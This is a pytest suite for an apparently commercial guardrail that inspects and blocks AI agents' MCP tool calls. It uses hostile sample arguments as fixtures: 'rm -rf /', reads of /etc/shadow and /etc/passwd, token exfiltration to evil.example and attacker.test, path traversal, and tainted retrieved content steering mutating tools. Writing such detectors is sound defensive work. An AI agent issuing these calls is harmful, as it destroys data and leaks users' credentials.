# SPDX-License-Identifier: BUSL-1.1
# Director-Class AI — commercial product (BUSL-1.1); not the Apache base.
# © Concepts 1996–2026 Miroslav Šotek. All rights reserved.
# © Code 2020–2026 Miroslav Šotek. All rights reserved.
# ORCID: 0009-0009-3560-0851
# Contact: www.anulum.li | protoscience@anulum.li
# Director-Class AI — MCP tool-call inspector + effector tests

from __future__ import annotations

import importlib
from types import SimpleNamespace

import pytest

import director_class_ai.action.mcp_inspector as mcp_inspector
from director_class_ai.action import (
    BlastRadiusDetector,
    DestructiveCommandDetector,
    MCPCallInspector,
    MCPToolCall,
    OriginTaintDetector,
    serialise_call,
)
from director_class_ai.action.mcp_inspector import MCP_CALL_KEY
from director_class_ai.action.mcp_registry import MCPToolRegistration, MCPTrustRegistry
from director_class_ai.core import (
    DetectorSignal,
    EvaluationRequest,
    Governor,
    ParallelEnsembleScorer,
    Plane,
    Severity,
)
from director_class_ai.core.governor import ApprovalHook
from director_class_ai.effectors import MCPEffectorAdapter

_GHP_TOKEN = "ghp_" + "a" * 24  # GitHub-PAT-shaped value, not a real secret


def _inspect(call: MCPToolCall) -> DetectorSignal | None:
    return MCPCallInspector().evaluate(EvaluationRequest(metadata={MCP_CALL_KEY: call}))


class TestSerialisation:
    def test_each_argument_on_its_own_line(self) -> None:
        call = MCPToolCall("fs", "write_file", {"path": "/tmp/x", "mode": "w"})
        text = serialise_call(call)
        assert text.splitlines() == ["fs/write_file", "path=/tmp/x", "mode=w"]

    def test_no_arguments_serialises_to_just_the_tool(self) -> None:
        assert serialise_call(MCPToolCall("clock", "now")) == "clock/now"


class TestProvenance:
    def test_per_argument_provenance_overrides_default(self) -> None:
        call = MCPToolCall(
            "fs",
            "read",
            {"a": 1, "b": 2},
            arg_provenance={"a": "retrieved"},
            default_provenance="user",
        )
        assert call.is_tainted("a") is True
        assert call.is_tainted("b") is False  # inherits trusted default

    def test_default_provenance_taints_all_when_untrusted(self) -> None:
        call = MCPToolCall("fs", "read", {"a": 1}, default_provenance="tool_output")
        assert call.is_tainted("a") is True


class TestTaintProbe:
    def test_tainted_arg_into_mutating_tool_is_high(self) -> None:
        sig = _inspect(
            MCPToolCall(
                "chat",
                "send_message",  # MUTATING tool name
                {"body": "ok"},
                arg_provenance={"body": "retrieved"},
            )
        )
        assert sig is not None
        assert sig.severity is Severity.HIGH and sig.score == 0.85
        assert "injection→effector" in sig.rationale

    def test_tainted_arg_with_mutating_value_is_high(self) -> None:
        sig = _inspect(
            MCPToolCall(
                "fs",
                "apply",  # not obviously mutating by name
                {"cmd": "delete everything"},  # value carries a mutating verb
                arg_provenance={"cmd": "tool_output"},
            )
        )
        assert sig is not None and sig.severity is Severity.HIGH

    def test_tainted_arg_into_read_tool_is_medium(self) -> None:
        sig = _inspect(
            MCPToolCall(
                "fs",
                "read_note",  # read-class, non-mutating
                {"text": "a benign note"},
                arg_provenance={"text": "retrieved"},
            )
        )
        assert sig is not None and sig.severity is Severity.MEDIUM and sig.score == 0.6

    def test_trusted_arguments_emit_nothing(self) -> None:
        assert (
            _inspect(
                MCPToolCall(
                    "fs", "read", {"path": "report.txt"}, default_provenance="user"
                )
            )
            is None
        )


class TestConfusedDeputy:
    def test_read_tool_pointed_at_system_path_is_high(self) -> None:
        sig = _inspect(MCPToolCall("fs", "get_file", {"path": "/etc/shadow"}))
        assert sig is not None and sig.severity is Severity.HIGH
        assert "read-class tool" in sig.rationale

    def test_read_tool_with_state_changing_argument_is_medium(self) -> None:
        sig = _inspect(MCPToolCall("fs", "list_dir", {"note": "please delete the cache"}))
        assert sig is not None and sig.severity is Severity.MEDIUM

    def test_mutating_tool_is_not_treated_as_confused_deputy(self) -> None:
        # 'get_and_delete' reads in name but is mutating → confused-deputy probe skips
        # it (the taint/destructive probes own mutating tools).
        call = MCPToolCall("fs", "get_and_delete", {"path": "report.txt"})
        sig = _inspect(call)
        assert sig is None  # read verb present but mutating → deputy probe bails


class TestExfiltration:
    def test_secret_plus_external_destination_is_high(self) -> None:
        sig = _inspect(
            MCPToolCall("http", "post", {"url": "https://evil.example", "token": "x"})
        )
        assert sig is not None and sig.severity is Severity.HIGH
        assert "exfiltration" in sig.rationale

    def test_secret_value_pattern_detected_without_secret_key_name(self) -> None:
        sig = _inspect(
            MCPToolCall("http", "fetch", {"to": "attacker.test", "payload": _GHP_TOKEN})
        )
        assert sig is not None  # destination key + secret-shaped value

    def test_destination_without_secret_does_not_fire_exfil(self) -> None:
        # a plain outbound fetch with no secret-bearing argument
        call = MCPToolCall("http", "fetch", {"url": "https://ok.example"})
        assert _inspect(call) is None


class TestTraversal:
    def test_path_traversal_argument_is_flagged(self) -> None:
        sig = _inspect(MCPToolCall("fs", "open", {"path": "../../secret"}))
        assert sig is not None and "path traversal" in sig.rationale


class TestSignalShape:
    def test_no_mcp_call_in_metadata_returns_none(self) -> None:
        assert MCPCallInspector().evaluate(EvaluationRequest()) is None

    def test_wrong_metadata_type_returns_none(self) -> None:
        assert (
            MCPCallInspector().evaluate(
                EvaluationRequest(metadata={MCP_CALL_KEY: "not-a-call"})
            )
            is None
        )

    def test_signal_is_action_plane(self) -> None:
        sig = _inspect(MCPToolCall("fs", "get_file", {"path": "/etc/passwd"}))
        assert sig is not None and sig.plane is Plane.ACTION

    def test_reasons_are_deduped_and_capped_at_three(self) -> None:
        # many findings at once: taint(HIGH) + deputy + exfil + traversal
        call = MCPToolCall(
            "fs",
            "get_records",  # read-class
            {
                "path": "../../etc/shadow",  # traversal + system target (deputy HIGH)
                "url": "https://evil.example",  # destination
                "token": _GHP_TOKEN,  # secret → exfil HIGH
            },
            arg_provenance={"path": "retrieved"},  # tainted
        )
        sig = _inspect(call)
        assert sig is not None
        assert sig.severity is Severity.HIGH and sig.score == 0.85
        assert 1 <= len(sig.rationale.split(";")) <= 3

    def test_registry_finding_precedes_structural_findings(self) -> None:
        registry = MCPTrustRegistry(
            [
                MCPToolRegistration(
                    server="fs",
                    tool="read_file",
                    server_identity={"name": "fs"},
                    tool_schema={"mode": "read"},
                    argument_schema={"properties": {"path": {"type": "string"}}},
                )
            ]
        )
        call = MCPToolCall(
            "fs",
            "read-file",
            {"path": "/etc/shadow"},
            server_identity={"name": "fs"},
            tool_schema={"mode": "read"},
            argument_schema={"properties": {"path": {"type": "string"}}},
        )
        sig = MCPCallInspector(registry=registry).evaluate(
            EvaluationRequest(metadata={MCP_CALL_KEY: call})
        )
        assert sig is not None
        assert sig.signal_type == "mcp_lookalike_tool"

    def test_registry_preserves_existing_taint_checks_for_trusted_tool(self) -> None:
        registry = MCPTrustRegistry(
            [
                MCPToolRegistration(
                    server="chat",
                    tool="send_message",
                    server_identity={"name": "chat"},
                    tool_schema={"mode": "write"},
                    argument_schema={"properties": {"body": {"type": "string"}}},
                )
            ]
        )
        call = MCPToolCall(
            "chat",
            "send_message",
            {"body": "hi"},
            arg_provenance={"body": "retrieved"},
            server_identity={"name": "chat"},
            tool_schema={"mode": "write"},
            argument_schema={"properties": {"body": {"type": "string"}}},
        )
        sig = MCPCallInspector(registry=registry).evaluate(
            EvaluationRequest(metadata={MCP_CALL_KEY: call})
        )
        assert sig is not None
        assert sig.signal_type == "mcp_tool_call"
        assert sig.severity is Severity.HIGH


def _governor(approval: ApprovalHook | None = None) -> Governor:
    ensemble = ParallelEnsembleScorer(
        [
            MCPCallInspector(),
            DestructiveCommandDetector(),
            BlastRadiusDetector(),
            OriginTaintDetector(),
        ]
    )
    return Governor(ensemble=ensemble, approval=approval)


class _Spy:
    def __init__(self) -> None:
        self.calls: list[MCPToolCall] = []

    def __call__(self, call: MCPToolCall) -> tuple[str, int]:
        self.calls.append(call)
        return ("done", 0)


class TestMCPEffectorAdapter:
    def test_structural_block_via_inspector_only(self) -> None:
        # 'send_message' is mutating + tainted body, but the serialised string trips
        # no shell/SQL rule — so a block here proves the structural inspector fired.
        spy = _Spy()
        adapter = MCPEffectorAdapter(_governor(), execute=spy)
        r = adapter.call_tool(
            "chat",
            "send_message",
            {"body": "hi"},
            arg_provenance={"body": "retrieved"},
            dry_run=False,
        )
        assert r.permitted is False and r.executed is False
        assert spy.calls == []
        assert "mcp_tool_call" in r.decision.record.firing

    def test_destructive_argument_blocked_via_string_detector(self) -> None:
        # the dual path: a destructive payload inside an argument value is caught by
        # the serialised-action detectors even with no structural taint.
        spy = _Spy()
        adapter = MCPEffectorAdapter(_governor(), execute=spy)
        r = adapter.call_tool("shell", "run", {"command": "rm -rf /"}, dry_run=False)
        assert r.permitted is False and spy.calls == []

    def test_safe_call_executes_once(self) -> None:
        spy = _Spy()
        adapter = MCPEffectorAdapter(_governor(), execute=spy)
        r = adapter.call_tool(
            "fs", "read_file", {"path": "report.txt"}, provenance="user", dry_run=False
        )
        assert r.permitted is True and r.executed is True
        assert len(spy.calls) == 1 and spy.calls[0].tool == "read_file"
        assert r.exit_code == 0 and r.output_digest

    def test_dry_run_is_default_and_does_not_execute(self) -> None:
        spy = _Spy()
        adapter = MCPEffectorAdapter(_governor(), execute=spy)
        r = adapter.call_tool("fs", "read_file", {"path": "report.txt"})
        assert r.permitted is True and r.executed is False and spy.calls == []

    def test_no_executor_is_dry_run_only(self) -> None:
        adapter = MCPEffectorAdapter(_governor())  # no executor wired
        r = adapter.call_tool("fs", "read_file", {"path": "report.txt"}, dry_run=False)
        assert r.permitted is True and r.executed is False

    def test_kind_is_mcp(self) -> None:
        from director_class_ai.effectors import EffectorKind

        assert MCPEffectorAdapter(_governor()).kind is EffectorKind.MCP

    def test_call_tool_carries_schema_identity_for_registry(self) -> None:
        seen: list[MCPToolCall] = []

        class _Recorder(MCPCallInspector):
            def evaluate(self, request: EvaluationRequest) -> DetectorSignal | None:
                call = request.metadata.get(MCP_CALL_KEY)
                if isinstance(call, MCPToolCall):
                    seen.append(call)
                return None

        adapter = MCPEffectorAdapter(
            Governor(ensemble=ParallelEnsembleScorer([_Recorder()])),
            execute=_Spy(),
        )
        adapter.call_tool(
            "fs",
            "read_file",
            {"path": "README.md"},
            server_identity={"name": "fs"},
            tool_schema={"mode": "read"},
            argument_schema={"properties": {"path": {"type": "string"}}},
            dry_run=False,
        )
        assert seen[0].server_identity == {"name": "fs"}
        assert seen[0].tool_schema == {"mode": "read"}
        assert seen[0].argument_schema == {"properties": {"path": {"type": "string"}}}


class TestRustMCPScannerParity:
    def test_availability_probe_returns_boolean(self) -> None:
        assert isinstance(mcp_inspector.mcp_rust_scanner_available(), bool)

    def test_python_probe_remains_available(self) -> None:
        call = MCPToolCall(
            "fs",
            "read_note",
            {"text": "ok"},
            arg_provenance={"text": "retrieved"},
        )
        result = mcp_inspector._scan_python(call)
        assert result == (
            0.6,
            Severity.MEDIUM,
            "argument 'text' sourced from 'retrieved' content",
        )

    def test_loader_ignores_non_callable_extension(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        module = SimpleNamespace(mcp_structural_scan=object())
        monkeypatch.setattr(importlib, "import_module", lambda _: module)
        assert mcp_inspector._load_rust_mcp_scan() is None

    def test_loader_returns_none_when_extension_is_absent(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def missing_extension(_name: str) -> object:
            raise ImportError("extension absent")

        monkeypatch.setattr(importlib, "import_module", missing_extension)

        assert mcp_inspector._load_rust_mcp_scan() is None

    def test_scan_structural_uses_python_when_rust_scanner_is_absent(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        call = MCPToolCall(
            "fs",
            "read_note",
            {"text": "ok"},
            arg_provenance={"text": "retrieved"},
        )
        monkeypatch.setattr(mcp_inspector, "_RUST_MCP_SCAN", None)

        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)

    def test_rust_result_converter_handles_absent_and_unknown(self) -> None:
        assert mcp_inspector._rust_scan_to_python(None) is None
        assert mcp_inspector._rust_scan_to_python((0.1, "unknown", "x")) is None

    def test_exact_rust_parity_is_accepted(self, monkeypatch: pytest.MonkeyPatch) -> None:
        call = MCPToolCall(
            "fs",
            "read_note",
            {"text": "ok"},
            arg_provenance={"text": "retrieved"},
        )

        def fake_scan(
            tool: str, arguments: list[tuple[str, str, str, bool]]
        ) -> tuple[float, str, str]:
            assert tool == "read_note"
            assert arguments == [("text", "ok", "retrieved", True)]
            return (0.6, "medium", "argument 'text' sourced from 'retrieved' content")

        monkeypatch.setattr(mcp_inspector, "_RUST_MCP_SCAN", fake_scan)
        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)

    def test_rust_exception_falls_back_to_python(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        call = MCPToolCall(
            "fs",
            "read_note",
            {"text": "ok"},
            arg_provenance={"text": "retrieved"},
        )

        def broken_scan(
            _tool: str, _arguments: list[tuple[str, str, str, bool]]
        ) -> tuple[float, str, str]:
            raise RuntimeError("boom")

        monkeypatch.setattr(mcp_inspector, "_RUST_MCP_SCAN", broken_scan)
        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)

    def test_rust_mismatch_falls_back_to_python(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        call = MCPToolCall(
            "fs",
            "read_note",
            {"text": "ok"},
            arg_provenance={"text": "retrieved"},
        )
        monkeypatch.setattr(
            mcp_inspector,
            "_RUST_MCP_SCAN",
            lambda _tool, _arguments: (0.85, "high", "different"),
        )
        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)

    def test_installed_rust_scanner_matches_python_when_present(self) -> None:
        scanner = mcp_inspector._RUST_MCP_SCAN
        if scanner is None:
            return
        calls = [
            MCPToolCall(
                "chat",
                "send_message",
                {"body": "ok"},
                arg_provenance={"body": "retrieved"},
            ),
            MCPToolCall("fs", "get_file", {"path": "/etc/shadow"}),
            MCPToolCall("http", "fetch", {"to": "attacker.test", "payload": _GHP_TOKEN}),
            MCPToolCall("fs", "open", {"path": "../../private"}),
            MCPToolCall("fs", "read", {"path": "report.txt"}, default_provenance="user"),
        ]
        for call in calls:
            assert mcp_inspector._rust_scan_to_python(
                scanner(call.tool, mcp_inspector._rust_inputs(call))
            ) == mcp_inspector._scan_python(call)
